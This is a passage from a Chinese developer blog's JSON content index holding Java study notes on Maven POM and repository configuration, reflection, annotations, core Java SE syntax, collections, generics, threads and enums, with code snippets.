链接会被自动创建 --&gt; &lt;unsubscribe&gt;banseon@126.com&lt;/unsubscribe&gt; &lt;!--你可以浏览邮件信息的URL --&gt; &lt;archive&gt;http:/hi.baidu.com/banseon/demo/dev/&lt;/archive&gt; &lt;/mailingList&gt;&lt;/mailingLists&gt;&lt;!--项目开发者列表 --&gt;&lt;developers&gt; &lt;!--某个项目开发者的信息 --&gt; &lt;developer&gt; &lt;!--SCM里项目开发者的唯一标识符 --&gt; &lt;id&gt;HELLO WORLD&lt;/id&gt; &lt;!--项目开发者的全名 --&gt; &lt;name&gt;banseon&lt;/name&gt; &lt;!--项目开发者的email --&gt; &lt;email&gt;banseon@126.com&lt;/email&gt; &lt;!--项目开发者的主页的URL --&gt; &lt;url /&gt; &lt;!--项目开发者在项目中扮演的角色，角色元素描述了各种角色 --&gt; &lt;roles&gt; &lt;role&gt;Project Manager&lt;/role&gt; &lt;role&gt;Architect&lt;/role&gt; &lt;/roles&gt; &lt;!--项目开发者所属组织 --&gt; &lt;organization&gt;demo&lt;/organization&gt; &lt;!--项目开发者所属组织的URL --&gt; &lt;organizationUrl&gt;http://hi.baidu.com/banseon&lt;/organizationUrl&gt; &lt;!--项目开发者属性，如即时消息如何处理等 --&gt; &lt;properties&gt; &lt;dept&gt;No&lt;/dept&gt; &lt;/properties&gt; &lt;!--项目开发者所在时区， -11到12范围内的整数。 --&gt; &lt;timezone&gt;-5&lt;/timezone&gt; &lt;/developer&gt;&lt;/developers&gt;&lt;!--项目的其他贡献者列表 --&gt;&lt;contributors&gt; &lt;!--项目的其他贡献者。参见developers/developer元素 --&gt; &lt;contributor&gt; &lt;name /&gt; &lt;email /&gt; &lt;url /&gt; &lt;organization /&gt; &lt;organizationUrl /&gt; &lt;roles /&gt; &lt;timezone /&gt; &lt;properties /&gt; &lt;/contributor&gt;&lt;/contributors&gt;&lt;!--该元素描述了项目所有License列表。 应该只列出该项目的license列表，不要列出依赖项目的 license列表。如果列出多个license，用户可以选择它们中的一个而不是接受所有license。 --&gt;&lt;licenses&gt; &lt;!--描述了项目的license，用于生成项目的web站点的license页面，其他一些报表和validation也会用到该元素。 --&gt; &lt;license&gt; &lt;!--license用于法律上的名称 --&gt; &lt;name&gt;Apache 2&lt;/name&gt; &lt;!--官方的license正文页面的URL --&gt; &lt;url&gt;http://www.baidu.com/banseon/LICENSE-2.0.txt&lt;/url&gt; &lt;!--项目分发的主要方式： repo，可以从Maven库下载 manual， 用户必须手动下载和安装依赖 --&gt; &lt;distribution&gt;repo&lt;/distribution&gt; &lt;!--关于license的补充信息 --&gt; &lt;comments&gt;A business-friendly OSS license&lt;/comments&gt; &lt;/license&gt;&lt;/licenses&gt;&lt;!--SCM(Source Control Management)标签允许你配置你的代码库，供Maven web站点和其它插件使用。 --&gt;&lt;scm&gt; &lt;!--SCM的URL,该URL描述了版本库和如何连接到版本库。欲知详情，请看SCMs提供的URL格式和列表。该连接只读。 --&gt; &lt;connection&gt; scm:svn:http://svn.baidu.com/banseon/maven/banseon/banseon-maven2-trunk(dao-trunk) &lt;/connection&gt; &lt;!--给开发者使用的，类似connection元素。即该连接不仅仅只读 --&gt; &lt;developerConnection&gt; scm:svn:http://svn.baidu.com/banseon/maven/banseon/dao-trunk &lt;/developerConnection&gt; &lt;!--当前代码的标签，在开发阶段默认为HEAD --&gt; &lt;tag /&gt; &lt;!--指向项目的可浏览SCM库（例如ViewVC或者Fisheye）的URL。 --&gt; &lt;url&gt;http://svn.baidu.com/banseon&lt;/url&gt;&lt;/scm&gt;&lt;!--描述项目所属组织的各种属性。Maven产生的文档用 --&gt;&lt;organization&gt; &lt;!--组织的全名 --&gt; &lt;name&gt;demo&lt;/name&gt; &lt;!--组织主页的URL --&gt; &lt;url&gt;http://www.baidu.com/banseon&lt;/url&gt;&lt;/organization&gt;&lt;!--构建项目需要的信息 --&gt; 其他配置信息参照： Maven POM教程https://www.runoob.com/maven/maven-pom.html Maven仓库 任何一个构件都有唯一坐标，Maven根据这个坐标定位了构件在仓库中的唯一存储路径 Maven仓库分类两类： 本地仓库 远程仓库，远程仓库分为三种： 中央仓库 私服 其他公共仓库 本地仓库 本地仓库时Maven在本地存储构建的地方，在安装Maven时不会被创建，在第一次执行Maven命令时才被创建 Maven本地仓库的默认位置：用户目录下的.m2/repository/ 还可在conf/settings.xml中修改本地库的位置 12&lt;!-- 本地仓库的路径，默认值为 --&gt;&lt;localRepository&gt;D:/myworkspace/Maven/repository&lt;/localRepository&gt; 远程仓库 用于获取其他人的Maven构件 中央仓库 默认的远程仓库，Maven在安装时，自带的就是中央仓库的配置 所有的Maven都议会继承超级POM，超级POM中包含如下配置： 1234567891011&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;central&lt;/id&gt; &lt;name&gt;Cntral Repository&lt;/name&gt; &lt;url&gt;http://repo.maven.apache.org&lt;/url&gt; &lt;layout&gt;default&lt;/layout&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 中央仓库包含了绝大多数流行的开源Java构件，以及源码，作者信息，SCM，信息，许可信息等 还可以在里面配置优先使用的镜像，比如在国内直接连接中央仓库较慢，一般使用阿里的镜像 12345678910&lt;!-- 镜像列表 --&gt;&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;!-- 被镜像的服务器ID --&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;/mirror&gt;&lt;/mirrors&gt; 私服 私服时一种特殊的远程仓库，它时架设在局域网的仓库服务，私服代理广域网上的远程仓库，供局域网的Maven用户使用。当Maven需要下载构件的时候，它从私服请求，如果私服上不存在该构件，则从外部的远程仓库中下载，缓存在私服上之后，再为Maven的下载请求提供服务 优点 加速构建 节约带宽 节约中央Maven仓库的带宽 稳定（应对一旦中央服务器出问题的情况） 可以建立本地内部仓库 可以建立公共仓库 如果没有特殊需求，一般只需要将私服地址配置为镜像，同时配置其代理所有的仓库就可以实现通过私服下载依赖的功能。镜像配置如下： 123456&lt;mirror&gt; &lt;id&gt;Nexus Mirror&lt;/id&gt; &lt;name&gt;Nexus Mirror&lt;/name&gt; &lt;url&gt;http://localhost:8081/nexus/content/groups/public&lt;/url&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt;&lt;/mirror&gt; 可以使用Docker搭建Nexus私服，私服可以有用户名和密码，可以在settings.xml中配置 Maven项目模板（了解） Archetype时一个Maven插件，其任务是按照其模板来创建一个项目结构。 执行如下命令即可创建Maven项目模板 1mvn archetype:generate 常用archetype有两种： maven-archetype-quickstart默认的Archetype maven-archetype-webapp 创建webapp可以使用如下命令 1mvn archetype:generate -DgroupId=com.ender -DartifactId=seckill -DarchetypeArtifactId=maven-archetype-webapp","categories":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/categories/Java/"},{"name":"Maven","slug":"Java/Maven","permalink":"http://enderxiao.github.io/categories/Java/Maven/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/tags/Java/"},{"name":"Maven","slug":"Maven","permalink":"http://enderxiao.github.io/tags/Maven/"}]},{"title":"java反射","slug":"java反射","date":"2021-01-28T02:53:11.000Z","updated":"2024-07-30T11:26:33.917Z","comments":true,"path":"2021/01/28/java反射/","permalink":"http://enderxiao.github.io/2021/01/28/java%E5%8F%8D%E5%B0%84/","excerpt":"java学习笔记，反射及其引用","text":"java学习笔记，反射及其引用 Java高级——反射 反射入门 java反射机制是在运行状态中，对于任意一个类，都能知道这个类的所有属性和方法，对于任意一个对象，都能调用它的一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制 java反射机制主要提供了一下功能： 在运行时判断任意一个对象所属的类 在运行时构造任意一个类的对象 在运行时判断一个类所具有的成员变量和方法； 在运行时调用任意一个对象的方法； 生成动态代理； 反射API 我们写的所有类，都会被appclassloader加载到内存的方法区，生成一个Class类型的对象（万物皆对象(～￣▽￣)～），他们是我们写的class，同时也涉及Class实列。也叫说明书的说明书 Class叫说明书的说明书，告诉了我们怎么写说明书，比如可以有方法、属性等等 我们的class都是说明书，说明了某类对象所具有的方法和属性 Java反射需要的类主要有： java.lang.Class java.lang.reflect包中的 Field Constructor Method Annotation Class类是Java反射的起源，针对任何一个你想探测的类，只有先产生它的一个Class类对象，接下来才能通过Class对象获取其他想要的信息 获取对象的方法 123456789//使用类Class cla = Dog.class;//使用全类名Class aClass = Class.forName(&quot;com.ender.Day&quot;);//使用对象Cat cat = new cat();Class cla = cat.getClass(); 操作字段 获取字段 1234567891011//只能获取到用public修饰的字段Field[] fields = animalClass.getFields();for (Field field : fields) &#123; System.out.println(field.getName());&#125; //能获取到所有被声明了的字段Field[] fields1 = animalClass.getDeclaredFields();for (Field field : fields1) &#123; System.out.println(field.getName());&#125; 字段赋值 12345678910111213141516try &#123;field.set(animal, &quot;张三&quot;);System.out.println(field.get(animal));&#125; catch (IllegalAccessException e)&#123; e.printStackTrace();&#125;try &#123; Field field = animalClass.getDeclaredField(&quot;age&quot;); field.setAccessible(true);//当在要操作类的文件夹之外的地方对私有字段注入值时，需要开启权限 field.set(animal,12); System.out.println(field.get(animal));&#125; catch (NoSuchFieldException | IllegalAccessException e)&#123; e.printStackTrace();&#125; 方法 获取方法 12345Method eat1 = animalClass.getMethod(&quot;eat&quot;);Method eat2 = animalClass.getDeclaredMethod(&quot;eat&quot;);Method eat = animalClass.getMethod(&quot;eat&quot;,String.class,int.class);//对于有参数的方法，需要如此获取，每个参数需要传入类型Method methods[] = animalClass.getDeclaredMethods(); 对方法的操作 12345678910111213141516Animal animal = new Animal();animal.setName(&quot;ZhangSan&quot;);animal.setAge(20);Class&lt;Animal&gt; animalClass = Animal.class;//获取某个方法，名字，后边是参数类型Method method = animalClass.getMethod(&quot;eat&quot;,String.class,int.class);//拿到参数的个数int parameterCount = method.getParameterCount();//拿到方法名字String name = method.getName();//拿到参数的类型数组Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();//拿到返回值类型Class&lt;?&gt; returnType = method.getReturnType();//重点。反射调用方法，传一个实列，和参数method.invoke(animal,&quot;LiSi&quot;,20); 构造函数 1234Class animalClass = Class.forName(&quot;com.ender.Animal&quot;);Constructor&lt;Animal&gt; constructor = animalClass.getConstructor();Animal animal = constructor.newInstance();animal.eat(); 反射与注释 123456789Animal animal = new Animal();Class&lt;Animal&gt; animalClass = Animal.class;A aannotation = animalClass.getAnnotation(A.class);//通过类获取该类的注释Field name = animalClass.getDeclaredField(&quot;name&quot;);name.setAccessible(true);//若该字段为私有，则需要以此设置访问权限，使得能够访问该字段的值Name nameAnnotion = name.getAnnotation(Name.class);//通过某个字段获取该字段的注释String fullName = nameAnnotion.name();//获取注释中的元素值name.set(animal,fullName);System.out.println(name.get(animal));","categories":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/categories/Java/"},{"name":"反射","slug":"Java/反射","permalink":"http://enderxiao.github.io/categories/Java/%E5%8F%8D%E5%B0%84/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/tags/Java/"},{"name":"Java反射","slug":"Java反射","permalink":"http://enderxiao.github.io/tags/Java%E5%8F%8D%E5%B0%84/"}]},{"title":"java注解","slug":"java注解","date":"2021-01-27T02:49:27.000Z","updated":"2024-07-30T11:26:33.917Z","comments":true,"path":"2021/01/27/java注解/","permalink":"http://enderxiao.github.io/2021/01/27/java%E6%B3%A8%E8%A7%A3/","excerpt":"java学习笔记，注解及其应用","text":"java学习笔记，注解及其应用 Java注解 注解定义 1234567891011121314@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.FIELD)public @interface Name &#123; int length() default 5; String name() default &quot;&quot;; int value() default 5;&#125;/** * 使用时可以是 * @Name(length = 12) * @Name(5) * @Name(value = 5, length = 12) */ 注解中的元素 注解中的元素只支持： 基础数据类型 String Class enum Annotation 上述类型的数组 编译器对默认值的限制 元素不能有不确定的值，即要么具有默认值，要么在使用时提供元素的值 对于非基本类型的元素，无论正在源码中还是在注解接口中定义默认值，都不能为null 注解不支持继承 注解不能继承，但注解在编译后，编译器会自动继承java.lang.annotation.Annotation接口，使用反编译可以看到 快捷方式 注释中定义了以value为名的元素，并且在使用该注解时，如果该元素是唯一需要赋值的元素，那么无需使用value = key的语法，只需在括号中给出value元素值即可，这可以应用于任何合法类型的元素，但限制了元素名必须为value Deprecated 使用@Deprecated注解的方法代表已过时，不推荐使用的方法，再idea的提示种会以删除线的形式展现，但是仍能正常使用 Override 使用@Override注解的方法代表是重写了父类的某个方法，当我们方法的名字出错时，编译器就会报错 Test 使用@Tes注解饰的方法，可以进行单元测试 SuppressWarnings 使用@SuppressWarnings注解的方法，再idea中将不再给出该方法内的警告，不推荐使用 @SuppressWarnings中的方法有： all，抑制所有警告 boxing，抑制与封装/拆装作业相关的警告 ccast，抑制与强制类型转换相关的警告 … 元注解 用来注解定义注解时的注解 Documented 使用@Documented注解的注解在生成API文档时将不会被忽略 Retention 注解可见度，定义了注解的生命周期 @Retention包含一个RetentionPolicy类型的属性value，Enum RetentionPolicy是一个枚举类型， 分为三个等级： RetentionPolicy.Source 源码级别，注解只被保留在源码，编译成class后，注解被遗弃 RetentionPolicy.CLASS 类文件级别， 注解被保留到class文件，但jvm加载class文件后将被遗弃，这是默认的生命周期 RetentionPolicy.RUNTIME 运行时，注解不仅被保留到class文件中，jvm加载后仍然存在 Target @Target用来约束注解可以应用的地方（如方法、类或字段），其中ElementType是枚举类型，表示可能的取值范围，取值如下： 12345678910111213141516171819202122public enum ElementType&#123; //可用于类、接口（包含注解类型）、或enum TYPE, //可用于字段（域）声明，包括enum实列 FIELD, //可用于方法声明 METHOD, //可用于参数声明 PARAMETER, //可用于构造函数声明 CONSTRUCTOR, //可用于局部变量声明 LOCAL_VARIABLE, //可用于注解声明（应用于另一注解上） ANNOTATION_TYPE, //可用于包声明 PACKAGE, //可用于类型参数声明 （1.8新增） TYPE_PARAMATER, //类型使用声明（1.8新增） TYPE_USE;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/categories/Java/"},{"name":"反射","slug":"Java/反射","permalink":"http://enderxiao.github.io/categories/Java/%E5%8F%8D%E5%B0%84/"},{"name":"注解","slug":"Java/注解","permalink":"http://enderxiao.github.io/categories/Java/%E6%B3%A8%E8%A7%A3/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/tags/Java/"},{"name":"Java反射","slug":"Java反射","permalink":"http://enderxiao.github.io/tags/Java%E5%8F%8D%E5%B0%84/"},{"name":"Java注解","slug":"Java注解","permalink":"http://enderxiao.github.io/tags/Java%E6%B3%A8%E8%A7%A3/"}]},{"title":"Java基础知识点汇总","slug":"Java基础知识点汇总","date":"2021-01-26T10:44:10.000Z","updated":"2024-07-30T11:26:33.910Z","comments":true,"path":"2021/01/26/Java基础知识点汇总/","permalink":"http://enderxiao.github.io/2021/01/26/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/","excerpt":"java 基础知识整合","text":"java 基础知识整合 Javase 基础 基础数据类型 四类八种 整型 Byte int short long 浮点 float double 布尔 boolean 字符型 char 取值范围 整型：byte −27→27−1-2^7 \\to 2^7 -1−27→27−1(10000000 表示-128) 浮点型：符号位 + 阶码（指数）+尾数 字符：一个字符两个字节（unicode） 字符发展 ASCII→ISO8856−7(1字节)→unicode(2字节)→utf−8(可变长字符集，英文1字节，中文2)ASCII \\to ISO8856-7(1字节) \\to unicode(2字节) \\to utf-8(可变长字符集，英文1字节，中文2)ASCII→ISO8856−7(1字节)→unicode(2字节)→utf−8(可变长字符集，英文1字节，中文2) GBK GB2312 中国国标字符集 变量 在内存中开辟一片空间，可以存数据 1//变量类型 变量名 = 具体值 作用 可以反复使用 对于引用类型来说，变量就是一个引用，指向内存的一块区域，我们想操作一个对象只需要使用它的引用即可 标识符命名规则 可以用_或$ 可以是字母数字，数字不能开头 所有名字必须驼峰式命名 变量、方法首字母小写，类名首字母大写，静态常量全部大写多个单词用下划线分割 不能使用关键字 少用或不用拼英，如果使用就整体全用拼英 强制类型转换 整型和整型：整型种小转大自动转，大转小需要强转，因为可能会丢失精度 整型和浮点型：浮点型转整型需要强转，反之不需要，但以科学计数法表示可能会丢失精度 char和整型：相互转换都为自动转换。 任何short、byte、int、char无论是逻辑运算还是数学运算的结果都是int 运算符 逻辑运算符 与 或 非 双与 双或 异或 &amp; | ！ &amp;&amp; || ^ 与：全真为真 或：全假为假 非：非真就是假、非假就是真 异或：相同为真不同为假 双与：短路元素运算符，前为假直接返回假，后面的不计算 双或：短路元素运算符，前为真直接返回真，后面的不计算 算术运算符 $+ - \\times \\div % $ 赋值运算符 = ++：++在前，先+再赋值，++在后先赋值再+ += -= 位运算符 &gt;&gt;：有符号右移 &lt;&lt;：有符号左移 &gt;&gt;&gt;：无符号右移 三目运算符 1//条件?结果一:结果二; 控制语句 选择结构 if语句 12345if (/*条件*/)&#123; &#125; else &#123; &#125; switch 123456789101112//i可以是 byte short int String enumswitch(i)&#123; case 1: System.out.printin();//操作 break; case 2: System.out.printin(); break; default: System.out.printin(); break;&#125; 循环结构 while 12345while (/*条件*/)&#123; &#125;do &#123;&#125; while (/*条件*/)//无论如何都会执行一次 for 1234//不同forfor (int i = 0; i &lt; 10; i++)&#123; &#125; 数组 定义 123//类型 名字[] = new 类型[长度];//类型 名字[] = (1,2,3);//类型 名字[]; new 类型[](1,2,3,4); 特性 一旦创建，类型、长度都无法更改 length代表她长度 下标从0开始，最后一个位length - 1 使用 名字[下标] 访问 越界抛出：ArrayIndexOutOfBoundsException 方法 1. 权限修饰符 作用域 当前类 同package 子孙类 其他package public √ √ √ √ protected √ √ √ × friendly(default) √ √ 同包子类可以 × private √ × × × 2. 返回值类型 3. static 静态方法和属性是属于类对象的，使用时不需要new对象，直接使用类名.方法名()，类名.属性 4. 名字 驼峰式，首字母小写 5. 参数 参数可以有多个，方法定义的地方叫形参，方法调用的地方叫实参 可变参数： 只能出现一次 必须放在最后 1public void f1(int ... nums)&#123;&#125; 方法重载 方法名一样 参数列表不一样 每个方法都有一个签名，就是用名字和参数签名的 递归 方法自己调用自己的过程 一定要有出口，没有出口将会栈内存溢出 斐波那契数列 6. 面向对象 封装 需要什么对象，就创建一个什么类，万物皆对象 12345678910public class User&#123; //使用public修饰时，文件名必须与类名相同 //一个文件中只能有一个被public修饰的类 //私有属性(属性推荐私有) //构造器 （可有0-多个） //实例方法 //getter and setter //toString(如果需要)&#125; 工具类和常量类 工具类中一般多为静态方法，常量类中大多时静态常量 1public static final String ORDER_SRARUS = &quot;已发货&quot;; 属性 属性全部私有，使用getter取值，setter赋值，能做安全控制 方法 构造器 new一个对象时会主动调用他的构造器 构造器可有多个 可以有不同参数的构造器 不自己写，就默认给一个无参构造器，一旦写了有参构造器，无参构造器就需要自己手写 继承 extends关键字，子类拥有父类（超类）的一切（除了被private修饰的） 构造子类时一定会先构造一个父类 子类可以重写父类的方法，重写的方法需要加一个注释@override Object 时所有类的顶级父类 类的构造顺序 父类的静态属性 父类的静态代码块 子类的静态属性 子类的静态代码块 父类的非静态属性 父类的非静态代码块 父类的构造器 子类的非静态属性 子类的非静态代码块 子类的构造器 this&amp;super this 指向本实列 super指向父类的实例 this和super可当构造器使用，但如果想使用super()必须放在第一行 多态 继承 重写 父类引用指向子类对象 12List&lt;Integer&gt; list = new ArrayList();List.add(1); Object的几个方法 equals hashcode 重写equals必须重写hashcode，主要是因为有hashmap，hashset这类的集合 toString 抽象类和接口 抽象类：拥有抽象方法的类，必须使用abstract修饰，可以没有抽象方法，继承时必须重写她的抽象方法 接口：全部都是抽象方法的类（没有方法体的方法），interface 实现接口implements,必须实现所有的抽象方法 类型转换 父类引用 →\\to→ 子类对象 不需要强转 向下转型 子类引用 →\\to→ 父类的对象 需要强转 向上转型 集合 集合是存东西的，能存很多同一种类型（包含他的子类）的对象 collection list（列表） ArrayList LinkList set set和list的区别： list是有序（指插入顺序和实际位置相关）、可重复的 set是无序（hash算法来确定位置）、不可重复的 hashset如何判断一个对象是否重复： 如果两个对象不是用同一地址，但是equals且hashcode一样，就说明一样 map（映射） 存一对key与value的映射 hashmap原理：数据结构是：数组+链表+红黑树 hashmap是无序的 集合遍历方式 list：普通for，增强for，迭代器（iterator） set：增强for，迭代器 set两种遍历方式 123456789//增强forfor (Integer integer : set)&#123; System.out.printlen(integer);&#125;//迭代器Iterator&lt;Integer&gt; iterator = set.iterator();while(iterator.hasNext())&#123; System.out.printlen(iterator.next());&#125; hashmap：entryset，迭代器 hashmap三种遍历方式： 1234567891011121314151617//第一种for (Map.Entry entry : map.entrySet() )&#123; System.out.printlen(entry.getKey()); System.out.printlen(entry.getValue());&#125;//第二种Set&lt;String&gt; keys = map.keySet();for (String key : keys)&#123; System.out.printlen(key);&#125;//第三种Iterator&lt;map.Entry, User&gt; &gt; iterator = map.entrySet().iterator();while(iterator.hasNext())&#123; Map.Entry&lt;String, User&gt; next = iterator.next(); System.out.printlen(next.getKey()); System.out.printlen(next.getValue());&#125; TreeMap 自动排序的map，数据结构是红黑树 TreeSet：底层就是一个TreeMap 泛型 引用自 Java泛型https://segmentfault.com/a/1190000019606768 定义 什么是泛型，看表面的意思，泛型就是指广泛的、普通的类型。在java中是指把类型明确的工作推迟到创建对象或调用方法的时候才去明确的特殊的类型。 例子： 123List&lt;String&gt; strings = new ArrayList&lt;String&gt;();strings.add(&quot;a String&quot;);String aString = strings.get(0); 通过可以将List内元素的类型限定为String类型，其中只能是引用类型，对于基本类型，可以使用对应的包装类型 泛型类 泛型类也就是把泛型定义在类上，这样用户在使用类的时候才把类型给确定下来。 1234567891011public class ObjectTool&lt;T&gt; &#123; private T obj; public T getObj() &#123; return obj; &#125; public void setObj(T obj) &#123; this.obj = obj; &#125;&#125; 可以看到上面这个程序，在使用时如果定义了类型，那么在使用时就可以不用进行强制类型转换，直接就可以得到一个T类型的对象。 泛型方法 有时候只关心某个方法，那么使用泛型时可以不定义泛型类，而是只定义一个泛型方法，如下 123public &lt;T&gt; void show(T t) &#123; System.out.println(t); &#125; 需要注意一下定义的格式，泛型必须得先定义才能够使用。 继承关系 泛型类在继承时，可以明确父类（泛型类）的参数类型，也可以不明确。 现在我们有如下的泛型类 //泛型类 123public interface Inter&lt;T&gt; &#123; public abstract void show(T t);&#125; 明确类型 //在实现泛型类时明确父类的类型 123456public class InterImpl implements Inter&lt;String&gt; &#123; @Override public void show(String s) &#123; System.out.println(s); &#125;&#125; 不明确类型 1234567public class InterImpl&lt;T&gt; implements Inter&lt;T&gt; &#123; @Override public void show(T t) &#123; System.out.println(t); &#125;&#125; 类型通配符 无界 类型通配符我感觉上和泛型方法差不多，只是不用在使用前进行定义，例子如下： 12345public void processElements(List&lt;?&gt; elements)&#123; for(Object o : elements)&#123; System.out.println(o); &#125;&#125; &quot;?&quot;可以接收任何类型。 上界 12345public void processElements(List&lt;? extends A&gt; elements)&#123; for(A a : elements)&#123; System.out.println(a.getValue()); &#125;&#125; 这种情况下能够接收A类或者A类的子类。 下界 12345public static void insertElements(List&lt;? super A&gt; list)&#123; list.add(new A()); list.add(new B()); list.add(new C());&#125; 这种情况下能够接收A类或者A类的父类 类型通配符和泛型方法 我认为这两种方式是差不多的，不过在使用时，如果参数之间是有依赖关系的，那么可以使用泛型方法，否则就使用类型通配符。（如果一个方法的返回值、某些参数的类型依赖另一个参数的类型就应该使用泛型方法，因为被依赖的类型如果是不确定的?，那么其他元素就无法依赖它）。 泛型擦除 泛型是提供给javac编译器使用的，它用于限定集合的输入类型，让编译器在源代码级别上，即挡住向集合中插入非法数据。但编译器编译完带有泛形的java程序后，生成的class文件中将不再带有泛形信息，以此使程序运行效率不受到影响，这个过程称之为“擦除”。 多线程 继承Thread类，实现run方法 1234567891011121314151617181920212223public class MyThread extends Thread &#123; public static void main(String[] args)&#123; MyThread t1 = new MyThread(&quot;t1&quot;); t1.start(); &#125; public MyThread()&#123;&#125; public MyThread(String name)&#123; super(name) &#125; @override public void run()&#123; while(true)&#123; try&#123; Thread.sleep(1000); &#125; catch (InterruptedException e)&#123; e.printStackTrace(); &#125; System.out.println(&quot;我是：&quot; + Thread.currentThread().getName()); &#125; &#125; &#125; 实现runnable接口，实现run方法 1234567891011121314public class MyRun implements Runnable &#123; public static void main(String[] args)&#123; Thread t1 = new Thread(new MyRun()); t1.start(); &#125; @override public void run()&#123; for(int i = 0; i &lt; 100; i++)&#123; ThreadTest.SB.append(1); &#125; &#125; &#125; 启动线程必须调用start方法，不能调用run，调用run只是方法调用，start是个native的本地方法，会调度cpu的资源，开辟线程 常用类 String String是引用数据类型，是final修饰的，一旦创建无法改变 String、StringBuffer、StringBuilder的区别 String不可变，线程安全的 StringBuffer是可变字符串，线程安全的 StringBuilder是可变字符串，前程不安全 当有大量字符串拼接的代码时，没有线程安全的要求就用StringBuilder（一般情况），有要求就用StringBuffer 工具类 Date、Math、Collections、Arrys、Canlader Date格式化： 123Date date = new Date();SimpleDateFormate s = new SimpleDateFormate(&quot;yyyy-MM-dd hh:mm:ss&quot;);String DateString = s.parse(date); 枚举 引用自 JAVA之枚举https://www.jianshu.com/p/7d3e3f6695a5 什么是枚举？ 我们学习过单例模式，即一个类只有一个实例。而枚举其实就是多例，一个类有多个实例，但实例的个数不是无穷的，是有限个数的。例如word文档的对齐方式有几种：左对齐、居中对齐、右对齐。开车的方向有几种：前、后、左、右！ 我们称呼枚举类中实例为枚举项！一般一个枚举类的枚举项的个数不应该太多，如果一个枚举类有30个枚举项就太多了！ 定义枚举类型 定义枚举类型需要使用enum关键字，例如： 1234public enum Direction &#123; FRONT, BEHIND, LEFT, RIGHT;&#125;Direction d = Direction.FRONT; 枚举可以用equals以及==来比较 枚举与switch 枚举类型可以在switch中使用 12345678910Direction d = Direction.FRONT; switch(d) &#123; case FRONT: System.out.println(&quot;前面&quot;);break; case BEHIND:System.out.println(&quot;后面&quot;);break; case LEFT: System.out.println(&quot;左面&quot;);break; case RIGHT: System.out.println(&quot;右面&quot;);break; default:System.out.println(&quot;错误的方向&quot;);&#125;Direction d1 = d;System.out.println(d1); 在switch中，不能使用枚举类名称，例如：“case Direction.FRONT：”这是错误的，因为编译器会根据switch中d的类型来判定每个枚举类型，在case中必须直接给出与d相同类型的枚举选项，而不能再有类型。 Enum类及方法 所有枚举类都是Enum的子类 所有枚举类都默认是Enum类的子类，无需我们使用extends来继承。这说明Enum中的方法所有枚举类都拥有。 int compareTo(E e)：比较两个枚举常量谁大谁小，其实比较的就是枚举常量在枚举类中声明的顺序，例如FRONT的下标为0，BEHIND下标为1，那么FRONT小于BEHIND； boolean equals(Object o)：比较两个枚举常量是否相等； int hashCode()：返回枚举常量的hashCode； String name()：返回枚举常量的名字； int ordinal()：返回枚举常量在枚举类中声明的序号，第一个枚举常量序号为0； String toString()：把枚举常量转换成字符串； static T valueOf(Class enumType, String name)：把字符串转换成枚举常量。 枚举类构造器 枚举类也可以有构造器，构造器默认都是private修饰，而且只能是private。因为枚举类的实例不能让外界来创建！ 1234567enum Direction &#123; FRONT, BEHIND, LEFT, RIGHT;//[在枚举常量后面必须添加分号，因为在枚举常量后面还有其他成员时，分号是必须的。枚举常量必须在枚举类中所有成员的上方声明。] Direction()//[枚举类的构造器不可以添加访问修饰符，枚举类的构造器默认是private的。但你自己不能添加private来修饰构造器。] &#123; System.out.println(&quot;hello&quot;); &#125;&#125; 其实创建枚举项就等同于调用本类的无参构造器，所以FRONT、BEHIND、LEFT、RIGHT四个枚举项等同于调用了四次无参构造器，所以你会看到四个hello输出。 枚举类成员 其实枚举类和正常的类一样，可以有实例变量，实例方法，静态方法等等，只不过它的实例个数是有限的，不能再创建实例而已。 123456789101112131415enum Direction &#123; FRONT(&quot;front&quot;), BEHIND(&quot;behind&quot;), LEFT(&quot;left&quot;), RIGHT(&quot;right&quot;); private String name; Direction(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125;&#125;Direction d = Direction.FRONT;System.out.println(d.getName()); 因为Direction类只有唯一的构造器，并且是有参的构造器，所以在创建枚举项时，必须为构造器赋值：FRONT(“front”)，其中”front”就是传递给构造器的参数。你不要鄙视这种语法，你应该做的是接受这种语法！ Direction类中还有一个实例域：String name，我们在构造器中为其赋值，而且本类还提供了getName()这个实例方法，它会返回name的值。 枚举类抽象方法 还可以在枚举类中给出抽象方法，然后在创建每个枚举项时使用“特殊”的语法来重复抽象方法。所谓“特殊”语法就是匿名内部类！也就是说每个枚举项都是一个匿名类的子类对象！ 通常fun()方法应该定义为抽象的方法，因为每个枚举常量都会去重写它。 你无法把Direction声明为抽象类，但需要声明fun()方法为抽象方法。 123456789101112131415161718192021222324enum Direction &#123; FRONT() &#123; public void fun() &#123; System.out.println(&quot;FROND：重写了fun()方法&quot;); &#125; &#125;, BEHIND() &#123; public void fun() &#123; System.out.println(&quot;BEHIND：重写了fun()方法&quot;); &#125; &#125;, LEFT() &#123; public void fun() &#123; System.out.println(&quot;LEFT：重写了fun()方法&quot;); &#125; &#125;, RIGHT() &#123; public void fun() &#123; System.out.println(&quot;RIGHT：重写了fun()方法&quot;); &#125; &#125;; public abstract void fun()[只需要把fun()方法修改为抽象方法，但不可以把Direction类声明为抽象类。];&#125; 每个枚举类两个特殊方法 每个枚举类都有两个不用声明就可以调用的static方法，而且这两个方法不是父类中的方法。这又是枚举类特殊的地方，下面是Direction类的特殊方法。 static Direction[] values()：返回本类所有枚举常量； static Direction valueOf(String 